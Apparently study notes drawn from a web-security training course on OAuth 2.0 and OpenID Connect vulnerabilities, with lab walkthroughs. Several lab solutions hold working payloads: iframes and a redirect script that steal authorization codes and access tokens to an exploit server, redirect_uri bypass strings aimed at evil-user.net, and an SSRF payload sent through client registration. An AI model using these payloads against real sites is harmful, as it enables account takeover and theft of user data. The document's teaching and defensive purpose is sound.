# While browsing the web, you've almost certainly come across sites that let you log in using your social media account. The chances are that this feature is built using the popular OAuth 2.0 framework. OAuth 2.0 is highly interesting for attackers because it is both extremely common and inherently prone to implementation mistakes. This can result in a number of vulnerabilities, allowing attackers to obtain sensitive user data and potentially bypass authentication completely. 

                                       			‚ö™Ô∏è What is OAuth?
   
# OAuth is a commonly used authorization framework that enables websites and web applications to request limited access to a user's account on another application.

                                       			‚ö™Ô∏è How does OAuth 2.0 work?
                                       			
            ‚óΩÔ∏è Client application - The website or web application that wants to access the user's data.                                        
            ‚óΩÔ∏è Resource owner - The user whose data the client application wants to access. 
            ‚óΩÔ∏è OAuth service provider - The website or application that controls the user's data and access to it. They support OAuth by providing an API for interacting with both an authorization server and a resource server. 

# There are numerous different ways that the actual OAuth process can be implemented. These are known as OAuth "flows" or "grant types".     

 -----> OAuth authentication is generally implemented as follows:
                        1. The user chooses the option to log in with their social media account. The client application then uses the social media site's OAuth service to request access to some data that it can use to identify the user. This could be the email address that is registered with their account, for example. 
                        2. After receiving an access token, the client application requests this data from the resource server, typically from a dedicated /userinfo endpoint. 
                        3. Once it has received the data, the client application uses it in place of a username to log the user in. The access token that it received from the authorization server is often used instead of a traditional password.
                        

						             					   				
üî∂Ô∏è EXAMPLE:
      1. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that make up the OAuth flow. This starts from the authorization request GET /auth?client_id=[...]. 
      2. Notice that the client application (the blog website) receives some basic information about the user from the OAuth service. It then logs the user in by sending a POST request containing this information to its own /authenticate endpoint, along with the access token. 
      3. Send the POST /authenticate request to Burp Repeater. In Repeater, change the email address to carlos@carlos-montoya.net and send the request. Observe that you do not encounter an error. 
      4. Right-click on the POST request and select "Request in browser" > "In original session". Copy this URL and visit it in the browser. You are logged in as Carlos and the lab is solved. 
      

                                   			‚ö™Ô∏è How do OAuth authentication vulnerabilities arise?
                                   			
‚ñ´Ô∏è OAuth authentication vulnerabilities arise partly because the OAuth specification is relatively vague and flexible by design. 
  
                                   			‚ö™Ô∏è Identifying OAuth authentication
                                   			
 # Recognizing when an application is using OAuth authentication is relatively straightforward. If you see an option to log in using your account from a different website, this is a strong indication that OAuth is being used. 
 # Regardless of which OAuth grant type is being used, the first request of the flow will always be a request to the /authorization endpoint containing a number of query parameters that are used specifically for OAuth. 
 
 # In particular, keep an eye out for the client_id, redirect_uri, and response_type parameters. For example, an authorization request will usually look something like this: 
              üî∂Ô∏è EXAMPLE: GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
                       Host: oauth-authorization-server.com
 
                               				‚ö™Ô∏è Recon
                               				
 # Doing some basic recon of the OAuth service being used can point you in the right direction when it comes to identifying vulnerabilities. 
 # If an external OAuth service is used, you should be able to identify the specific provider from the hostname to which the authorization request is sent.
 
    Once you know the hostname of the authorization server, you should always try sending a GET request to the following standard endpoints: 
          1. /.well-known/oauth-authorization-server
          2. /.well-known/openid-configuration
          
# These will often return a JSON configuration file containing key information, such as details of additional features that may be supported.
# This will sometimes tip you off about a wider attack surface and supported features that may not be mentioned in the documentation. 

                      					‚ö™Ô∏è Exploiting OAuth authentication vulnerabilities
                      					
  Vulnerabilities can arise in the client application's implementation of OAuth as well as in the configuration of the OAuth service itself.
  
    1.1 #Vulnerabilities in the OAuth client application
 # Client applications will often use a reputable, battle-hardened OAuth service that is well protected against widely known exploits. However, their own side of the implementation may be less secure.
 # Improper implementation of the implicit grant type
 # the access token is sent from the OAuth service to the client application via the user's browser as a URL fragment.
 # The client application then accesses the token using JavaScript
 # The trouble is, if the application wants to maintain the session after the user closes the page, it needs to store the current user data (normally a user ID and the access token) somewhere. 
 # To solve this problem, the client application will often submit this data to the server in a POST request and then assign the user a session cookie, effectively logging them in.
 # This request is roughly equivalent to the form submission request that might be sent as part of a classic, password-based login. However, in this scenario, the server does not have any secrets or passwords to compare with the submitted data, which means that it is implicitly trusted. 
 # In the implicit flow, this POST request is exposed to attackers via their browser. As a result, this behavior can lead to a serious vulnerability if the client application doesn't properly check that the access token matches the other data in the request.
 
                        				‚ö™Ô∏è Flawed CSRF protection
                        				
 # Although many components of the OAuth flows are optional, some of them are strongly recommended unless there's an important reason not to use them. One such example is the state parameter. 
 # The state parameter should ideally contain an unguessable value, such as the hash of something tied to the user's session when it first initiates the OAuth flow.
 # If you notice that the authorization request does not send a state parameter, this is extremely interesting from an attacker's perspective.
 # It potentially means that they can initiate an OAuth flow themselves before tricking a user's browser into completing it, similar to a traditional CSRF attack
 # Note that if the site allows users to log in exclusively via OAuth, the state parameter is arguably less critical. 
 # However, not using a state parameter can still allow attackers to construct login CSRF attacks, whereby the user is tricked into logging in to the attacker's account. 
 

üîòÔ∏è Lab: Forced OAuth profile linking

# Go to the exploit server and create an iframe in which the src attribute points to the URL you just copied. The result should look something like this: 
	<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>

							‚ö™Ô∏è Leaking authorization codes and access tokens

‚ñ´Ô∏è Perhaps the most infamous OAuth-based vulnerability is when the configuration of the OAuth service itself enables attackers to steal authorization codes or access tokens associated with other users' accounts. By stealing a valid code or token, the attacker may be able to access the victim's data. 

‚ñ´Ô∏è Ultimately, this can completely compromise their account - the attacker could potentially log in as the victim user on any client application that is registered with this OAuth service. 								
	
‚ñ´Ô∏è Depending on the grant type, either a code or token is sent via the victim's browser to the /callback endpoint specified in the redirect_uri parameter of the authorization request. 

‚ñ´Ô∏è If the OAuth service fails to validate this URI properly, an attacker may be able to construct a CSRF-like attack, tricking the victim's browser into initiating an OAuth flow that will send the code or token to an attacker-controlled redirect_uri	
	
‚ñ´Ô∏è In the case of the authorization code flow, an attacker can potentially steal the victim's code before it is used. 
‚ñ´Ô∏è They can then send this code to the client application's legitimate /callback endpoint (the original redirect_uri) to get access to the user's account. 
‚ñ´Ô∏è In this scenario, an attacker does not even need to know the client secret or the resulting access token. 
‚ñ´Ô∏è As long as the victim has a valid session with the OAuth service, the client application will simply complete the code/token exchange on the attacker's behalf before logging them in to the victim's account. 

‚ñ´Ô∏è Note that using state or nonce protection does not necessarily prevent these attacks because an attacker can generate new values from their own browser. 

Lab: OAuth account hijacking via redirect_uri

‚ñ´Ô∏è This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.

<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>

‚ñ´Ô∏è More secure authorization servers will require a redirect_uri parameter to be sent when exchanging the code as well. 
‚ñ´Ô∏è The server can then check whether this matches the one it received in the initial authorization request and reject the exchange if not. 
‚ñ´Ô∏è As this happens in server-to-server requests via a secure back-channel, the attacker is not able to control this second redirect_uri parameter. 

								‚ö™Ô∏è Flawed redirect_uri validation
								
‚ñ´Ô∏è Due to the kinds of attacks seen in the previous lab, it is best practice for client applications to provide a whitelist of their genuine callback URIs when registering with the OAuth service. 
‚ñ´Ô∏è This way, when the OAuth service receives a new request, it can validate the redirect_uri parameter against this whitelist. 
‚ñ´Ô∏è In this case, supplying an external URI will likely result in an error. However, there may still be ways to bypass this validation. 

‚ñ´Ô∏è When auditing an OAuth flow, you should try experimenting with the redirect_uri parameter to understand how it is being validated. For example: 

1. Some implementations allow for a range of subdirectories by checking only that the string starts with the correct sequence of characters i.e. an approved domain. You should try removing or adding arbitrary paths, query parameters, and fragments to see what you can change without triggering an error. 

2. If you can append extra values to the default redirect_uri parameter, you might be able to exploit discrepancies between the parsing of the URI by the different components of the OAuth service. For example, you can try techniques such as:

https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/

# If you're not familiar with these techniques, we recommend reading our content on how to circumvent common SSRF defences and CORS. 

3. You may occasionally come across server-side parameter pollution vulnerabilities. Just in case, you should try submitting duplicate redirect_uri parameters as follows: 

https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net

4. Some servers also give special treatment to localhost URIs as they're often used during development. In some cases, any redirect URI beginning with localhost may be accidentally permitted in the production environment. This could allow you to bypass the validation by registering a domain name such as localhost.evil-user.net. 

‚ñ´Ô∏è It is important to note that you shouldn't limit your testing to just probing the redirect_uri parameter in isolation. In the wild, you will often need to experiment with different combinations of changes to several parameters. 
‚ñ´Ô∏è Sometimes changing one parameter can affect the validation of others. 
‚ñ´Ô∏è For example, changing the response_mode from query to fragment can sometimes completely alter the parsing of the redirect_uri, allowing you to submit URIs that would otherwise be blocked. 
‚ñ´Ô∏è Likewise, if you notice that the web_message response mode is supported, this often allows a wider range of subdomains in the redirect_uri. 

üîòÔ∏è Stealing codes and access tokens via a proxy page

‚ñ´Ô∏è Against more robust targets, you might find that no matter what you try, you are unable to successfully submit an external domain as the redirect_uri. However, that doesn't mean it's time to give up.

‚ñ´Ô∏è By this stage, you should have a relatively good understanding of which parts of the URI you can tamper with. The key now is to use this knowledge to try and access a wider attack surface within the client application itself. In other words, try to work out whether you can change the redirect_uri parameter to point to any other pages on a whitelisted domain.

‚ñ´Ô∏è Try to find ways that you can successfully access different subdomains or paths. For example, the default URI will often be on an OAuth-specific path, such as /oauth/callback, which is unlikely to have any interesting subdirectories. However, you may be able to use directory traversal tricks to supply any arbitrary path on the domain. Something like this: 

	https://client-app.com/oauth/callback/../../example/path

‚ñ´Ô∏è May be interpreted on the back-end as: 

	https://client-app.com/example/path

‚ñ´Ô∏è Once you identify which other pages you are able to set as the redirect URI, you should audit them for additional vulnerabilities that you can potentially use to leak the code or token. For the authorization code flow, you need to find a vulnerability that gives you access to the query parameters, whereas for the implicit grant type, you need to extract the URL fragment. 

‚ñ´Ô∏è One of the most useful vulnerabilities for this purpose is an open redirect. You can use this as a proxy to forward victims, along with their code or token, to an attacker-controlled domain where you can host any malicious script you like. 

‚ñ´Ô∏è Note that for the implicit grant type, stealing an access token doesn't just enable you to log in to the victim's account on the client application. As the entire implicit flow takes place via the browser, you can also use the token to make your own API calls to the OAuth service's resource server. This may enable you to fetch sensitive user data that you cannot normally access from the client application's web UI. 

üî∂Ô∏è Lab: Stealing OAuth access tokens via an open redirect

‚ñ´Ô∏è This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

‚ñ´Ô∏è You now need to create an exploit that first forces the victim to visit your malicious URL and then executes the script you just tested to steal their access token. For example: 

<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>

üîòÔ∏è Dangerous JavaScript that handles query parameters and URL fragments

‚ñ´Ô∏è For example, insecure web messaging scripts can be great for this. In some scenarios, you may have to identify a longer gadget chain that allows you to pass the token through a series of scripts before eventually leaking it to your external domain. 		

üîòÔ∏è XSS vulnerabilities

‚ñ´Ô∏èAlthough XSS attacks can have a huge impact on their own, there is typically a small time frame in which the attacker has access to the user's session before they close the tab or navigate away. 
‚ñ´Ô∏è As the HTTPOnly attribute is commonly used for session cookies, an attacker will often also be unable to access them directly using XSS. 
‚ñ´Ô∏è However, by stealing an OAuth code or token, the attacker can gain access to the user's account in their own browser. 
‚ñ´Ô∏è This gives them much more time to explore the user's data and perform harmful actions, significantly increasing the severity of the XSS vulnerability. 


üîòÔ∏è HTML injection vulnerabilities

In cases where you cannot inject JavaScript (for example, due to CSP constraints or strict filtering), you may still be able to use a simple HTML injection to steal authorization codes. 
‚ñ´Ô∏è If you can point the redirect_uri parameter to a page on which you can inject your own HTML content, you might be able to leak the code via the Referer header. 
‚ñ´Ô∏è For example, consider the following img element: <img src="evil-user.net">. 
‚ñ´Ô∏è When attempting to fetch this image, some browsers (such as Firefox) will send the full URL in the Referer header of the request, including the query string. 



üî∂Ô∏è Lab: Stealing OAuth access tokens via a proxy page

‚ñ´Ô∏è This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application. 

SOLUTION:

<iframe src="https://oauth-0ae800c503f9042dc1afced902b3003e.oauth-server.net/auth?client_id=ckvli73uufhsbgy1ar7rh&redirect_uri=https://0a1d00f7036404acc14fd0aa004f00ac.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>


<script>
    window.addEventListener('message', function(e) {
        fetch("/" + encodeURIComponent(e.data.data))
    }, false)
</script>

‚óΩÔ∏è Go back to the exploit server and deliver this exploit to the victim. Copy their access token from the log. Make sure you don't accidentally include any of the surrounding URL-encoded characters. 


								‚ö™Ô∏è Flawed scope validation

‚ñ´Ô∏è In any OAuth flow, the user must approve the requested access based on the scope defined in the authorization request. 
‚ñ´Ô∏è The resulting token allows the client application to access only the scope that was approved by the user. 
‚ñ´Ô∏è But in some cases, it may be possible for an attacker to "upgrade" an access token (either stolen or obtained using a malicious client application) with extra permissions due to flawed validation by the OAuth service. 
‚ñ´Ô∏è The process for doing this depends on the grant type.								

‚óΩÔ∏è Scope upgrade: authorization code flow

‚ñ´Ô∏è With the authorization code grant type, the user's data is requested and sent via secure server-to-server communication, which a third-party attacker is typically not able to manipulate directly. However, it may still be possible to achieve the same result by registering their own client application with the OAuth service.

‚ñ´Ô∏è For example, let's say the attacker's malicious client application initially requested access to the user's email address using the openid email scope. After the user approves this request, the malicious client application receives an authorization code. As the attacker controls their client application, they can add another scope parameter to the code/token exchange request containing the additional profile scope:

client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8&scope=openid%20 email%20profile

‚ñ´Ô∏è If the server does not validate this against the scope from the initial authorization request, it will sometimes generate an access token using the new scope and send this to the attacker's client application: 

{
    "access_token": "z0y9x8w7v6u5",
    "token_type": "Bearer",
    "expires_in": 3600,
    "scope": "openid email profile",
    ‚Ä¶
}

‚ñ´Ô∏èThe attacker can then use their application to make the necessary API calls to access the user's profile data. 

‚óΩÔ∏è Scope upgrade: implicit flow

‚ñ´Ô∏è  For the implicit grant type, the access token is sent via the browser, which means an attacker can steal tokens associated with innocent client applications and use them directly. Once they have stolen an access token, they can send a normal browser-based request to the OAuth service's /userinfo endpoint, manually adding a new scope parameter in the process.

‚ñ´Ô∏è Ideally, the OAuth service should validate this scope value against the one that was used when generating the token, but this isn't always the case. As long as the adjusted permissions don't exceed the level of access previously granted to this client application, the attacker can potentially access additional data without requiring further approval from the user. 


‚óΩÔ∏è Unverified user registration

‚ñ´Ô∏è  When authenticating users via OAuth, the client application makes the implicit assumption that the information stored by the OAuth provider is correct. This can be a dangerous assumption to make.

‚ñ´Ô∏è Some websites that provide an OAuth service allow users to register an account without verifying all of their details, including their email address in some cases. ‚ñ´Ô∏è An attacker can exploit this by registering an account with the OAuth provider using the same details as a target user, such as a known email address. 
‚ñ´Ô∏è Client applications may then allow the attacker to sign in as the victim via this fraudulent account with the OAuth provider. 

‚óΩÔ∏è Extending OAuth with OpenID Connect

							‚ö™Ô∏è OpenID Connect
							
üî∂Ô∏è What is OpenID Connect?

‚ñ´Ô∏è OpenID Connect extends the OAuth protocol to provide a dedicated identity and authentication layer that sits on top of the basic OAuth implementation. It adds some simple functionality that enables better support for the authentication use case of OAuth. 

‚ñ´Ô∏è OAuth was not initially designed with authentication in mind; it was intended to be a means of delegating authorizations for specific resources between applications.

‚ñ´Ô∏è OpenID Connect solves a lot of these problems by adding standardized, identity-related features to make authentication via OAuth work in a more reliable and uniform way. 

üî∂Ô∏è How does OpenID Connect work?

‚ñ´Ô∏èOpenID Connect slots neatly into the normal OAuth flows. From the client application's perspective, the key difference is that there is an additional, standardized set of scopes that are the same for all providers, and an extra response type: id_token. 

üî∂Ô∏è OpenID Connect roles

‚ñ´Ô∏è The roles for OpenID Connect are essentially the same as for standard OAuth. The main difference is that the specification uses slightly different terminology. 


    1. Relying party - The application that is requesting authentication of a user. This is synonymous with the OAuth client application.
    2. End user - The user who is being authenticated. This is synonymous with the OAuth resource owner.
    3. OpenID provider - An OAuth service that is configured to support OpenID Connect.

üî∂Ô∏è OpenID Connect claims and scopes

‚ñ´Ô∏è The term "claims" refers to the key:value pairs that represent information about the user on the resource server. One example of a claim could be "family_name":"Montoya". 

‚ñ´Ô∏è Unlike basic OAuth, whose scopes are unique to each provider, all OpenID Connect services use an identical set of scopes. In order to use OpenID Connect, the client application must specify the scope openid in the authorization request. They can then include one or more of the other standard scopes: 

    1. profile
    2. email
    3. address
    4. phone

‚ñ´Ô∏èEach of these scopes corresponds to read access for a subset of claims about the user that are defined in the OpenID specification. For example, requesting the scope openid profile will grant the client application read access to a series of claims related to the user's identity, such as family_name, given_name, birth_date, and so on. 

üî∂Ô∏è ID token

‚ñ´Ô∏è The other main addition provided by OpenID Connect is the id_token response type. 
‚ñ´Ô∏è This returns a JSON web token (JWT) signed with a JSON web signature (JWS). 
‚ñ´Ô∏è The JWT payload contains a list of claims based on the scope that was initially requested. 
‚ñ´Ô∏è It also contains information about how and when the user was last authenticated by the OAuth service. 
‚ñ´Ô∏è The client application can use this to decide whether or not the user has been sufficiently authenticated. 

‚ñ´Ô∏è The main benefit of using id_token is the reduced number of requests that need to be sent between the client application and the OAuth service, which could provide better performance overall. 
‚ñ´Ô∏è Instead of having to get an access token and then request the user data separately, the ID token containing this data is sent to the client application immediately after the user has authenticated themselves. 

‚ñ´Ô∏è Rather than simply relying on a trusted channel, as happens in basic OAuth, the integrity of the data transmitted in an ID token is based on a JWT cryptographic signature. 
‚ñ´Ô∏è For this reason, the use of ID tokens may help protect against some man-in-the-middle attacks. 
‚ñ´Ô∏è However, given that the cryptographic keys for signature verification are transmitted over the same network channel (normally exposed on /.well-known/jwks.json), some attacks are still possible. 

‚ñ´Ô∏è Note that multiple response types are supported by OAuth, so it's perfectly acceptable for a client application to send an authorization request with both a basic OAuth response type and OpenID Connect's id_token response type: 

response_type=id_token token
response_type=id_token code

‚ñ´Ô∏èIn this case, both an ID token and either a code or access token will be sent to the client application at the same time. 


üî∂Ô∏è Identifying OpenID Connect

‚ñ´Ô∏è If OpenID connect is actively being used by the client application, this should be obvious from the authorization request. The most foolproof way to check is to look for the mandatory openid scope. 

‚ñ´Ô∏è Even if the login process does not initially appear to be using OpenID Connect, it is still worth checking whether the OAuth service supports it. You can simply try adding the openid scope or changing the response type to id_token and observing whether this results in an error. 

‚ñ´Ô∏è As with basic OAuth, it's also a good idea to take a look at the OAuth provider's documentation to see if there's any useful information about their OpenID Connect support. You may also be able to access the configuration file from the standard endpoint /.well-known/openid-configuration. 

üî∂Ô∏è OpenID Connect vulnerabilities

‚ñ´Ô∏è The specification for OpenID Connect is much stricter than that of basic OAuth, which means there is generally less potential for quirky implementations with glaring vulnerabilities. 
‚ñ´Ô∏è That said, as it is just a layer that sits on top of OAuth, the client application or OAuth service may still be vulnerable to some of the OAuth-based attacks we looked at earlier. 
‚ñ´Ô∏è In fact, you might have noticed that all of our OAuth authentication labs also use OpenID Connect. 

üî∂Ô∏è Unprotected dynamic client registration

‚ñ´Ô∏è The OpenID specification outlines a standardized way of allowing client applications to register with the OpenID provider. If dynamic client registration is supported, the client application can register itself by sending a POST request to a dedicated /registration endpoint. The name of this endpoint is usually provided in the configuration file and documentation.

‚ñ´Ô∏è In the request body, the client application submits key information about itself in JSON format. For example, it will often be required to include an array of whitelisted redirect URIs. It can also submit a range of additional information, such as the names of the endpoints they want to expose, a name for their application, and so on. A typical registration request may look something like this: 

POST /openid/register HTTP/1.1
Content-Type: application/json
Accept: application/json
Host: oauth-authorization-server.com
Authorization: Bearer ab12cd34ef56gh89

{
    "application_type": "web",
    "redirect_uris": [
        "https://client-app.com/callback",
        "https://client-app.com/callback2"
        ],
    "client_name": "My Application",
    "logo_uri": "https://client-app.com/logo.png",
    "token_endpoint_auth_method": "client_secret_basic",
    "jwks_uri": "https://client-app.com/my_public_keys.jwks",
    "userinfo_encrypted_response_alg": "RSA1_5",
    "userinfo_encrypted_response_enc": "A128CBC-HS256",
    ‚Ä¶
}

‚ñ´Ô∏è  The OpenID provider should require the client application to authenticate itself. In the example above, they're using an HTTP bearer token. However, some providers will allow dynamic client registration without any authentication, which enables an attacker to register their own malicious client application. This can have various consequences depending on how the values of these attacker-controllable properties are used. 

‚ñ´Ô∏è For example, you may have noticed that some of these properties can be provided as URIs. If any of these are accessed by the OpenID provider, this can potentially lead to second-order SSRF vulnerabilities unless additional security measures are in place. 

üîòÔ∏è Lab: SSRF via OpenID dynamic client registration

‚ñ´Ô∏è This lab allows client applications to dynamically register themselves with the OAuth service via a dedicated registration endpoint. Some client-specific data is used in an unsafe way by the OAuth service, which exposes a potential vector for SSRF. 

SOLUTION:

STEP1: While proxying traffic through Burp, log in to your own account. Browse to https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/.well-known/openid-configuration to access the configuration file. Notice that the client registration endpoint is located at /reg

STEP2: You must at least provide a redirect_uris array containing an arbitrary whitelist of callback URIs for your fake application. For example:

POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json

{
    "redirect_uris" : [
        "https://example.com"
    ]
}


STEP3: Send the request. Observe that you have now successfully registered your own client application without requiring any authentication. The response contains various metadata associated with your new client application, including a new client_id.

STEP4: Using Burp, audit the OAuth flow and notice that the "Authorize" page, where the user consents to the requested permissions, displays the client application's logo. This is fetched from /client/CLIENT-ID/logo. We know from the OpenID specification that client applications can provide the URL for their logo using the logo_uri property during dynamic registration. Send the GET /client/CLIENT-ID/logo request to Burp Repeater. 

Eg. GET /client/-AHFuoSQw7U3Y0SFlYD8u/logo HTTP/1.1
   Host: oauth-0a4b000603748b2dc184104102c300af.oauth-server.net

STEP5: In Repeater, go back to the POST /reg request that you created earlier. Add the logo_uri property. 

POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json

{
    "redirect_uris" : [
        "https://example.com"
    ],
    "logo_uri" : "https://BURP-COLLABORATOR-SUBDOMAIN"
}

STEP6:  Send the request to register a new client application and copy the client_id from the response.
        In Repeater, go to the GET /client/CLIENT-ID/logo request. Replace the CLIENT-ID in the path with the new one you just copied and send the request. 

STEP7: Go to the Collaborator tab dialog and check for any new interactions. Notice that there is an HTTP interaction attempting to fetch your non-existent logo. This confirms that you can successfully use the logo_uri property to elicit requests from the OAuth server. 


								‚ö™Ô∏è Allowing authorization requests by reference

‚ñ´Ô∏è Up to this point, we've looked at the standard way of submitting the required parameters for the authorization request i.e. via the query string. 
‚ñ´Ô∏è Some OpenID providers give you the option to pass these in as a JSON web token (JWT) instead. 
‚ñ´Ô∏è If this feature is supported, you can send a single request_uri parameter pointing to a JSON web token that contains the rest of the OAuth parameters and their values. 
‚ñ´Ô∏è Depending on the configuration of the OAuth service, this request_uri parameter is another potential vector for SSRF. 								

‚ñ´Ô∏è You might also be able to use this feature to bypass validation of these parameter values. Some servers may effectively validate the query string in the authorization request, but may fail to adequately apply the same validation to parameters in a JWT, including the redirect_uri.

‚ñ´Ô∏è To check whether this option is supported, you should look for the request_uri_parameter_supported option in the configuration file and documentation. Alternatively, you can just try adding the request_uri parameter to see if it works. You will find that some servers support this feature even if they don't explicitly mention it in their documentation. 


								‚ö™Ô∏è How to prevent OAuth authentication vulnerabilities

‚ñ´Ô∏è To prevent OAuth authentication vulnerabilities, it is essential for both the OAuth provider and the client application to implement robust validation of the key inputs, especially the redirect_uri parameter. There is very little built-in protection in the OAuth specification, so it's up to developers themselves to make the OAuth flow as secure as possible. 

‚ñ´Ô∏è It is important to note that vulnerabilities can arise both on the side of the client application and the OAuth service itself. Even if your own implementation is rock solid, you're still ultimately reliant on the application at the other end being equally robust. 



	
